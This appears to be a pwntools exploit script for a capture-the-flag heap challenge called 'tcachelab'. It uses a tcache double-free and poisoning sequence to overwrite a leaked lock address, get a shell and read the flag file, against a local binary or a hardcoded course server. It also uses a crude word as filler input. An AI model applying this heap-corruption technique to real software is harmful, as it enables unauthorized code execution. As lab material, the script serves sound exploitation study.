#!/usr/bin/python3

from pwn import *
import sys

BIN = './tcachelab'

if len(sys.argv) > 1:
    r = remote( '140.112.31.97', 30106 )
else:
    r = process( BIN )

def add(size, owner, uuid, data):
    r.sendafter("Choice >", '1')
    r.sendafter("size : ", str(size))
    r.sendafter("Owner : ", owner)
    r.sendafter("UUID : ", str(uuid))
    r.sendafter("Content : ", data)

def edit(idx, uuid, data):
    r.sendafter("Choice >", '2')
    r.sendafter("index : ", str(idx))
    r.sendafter("UUID : ", str(uuid))
    r.sendafter("Content : ", data)

def delete(idx):
    r.sendafter("Choice >", '3')
    r.sendafter("index : ", str(idx))

r.recvuntil('Lock address : ')
target = int(r.recvline()[2:-1], 16)
log.info(f'target: {hex(target)}')


add(0x10, 'fuck', 0x6969, 'Q')
add(0x10, 'fuck', 0x6969, 'Q')
delete(0)
delete(1)
edit(1, 0, 'QQ')
delete(1)

add(0x10, p64(target), 0x6969, 'Q')
add(0x10, 'fuck', 0x6969, 'Q')
add(0x10, p64(0xCAFEDEADBEEFCAFE), 0x6969, 'Q')

r.sendline('4')
sleep(0.3)
r.sendline('cat /home/`whoami`/flag')
r.interactive()
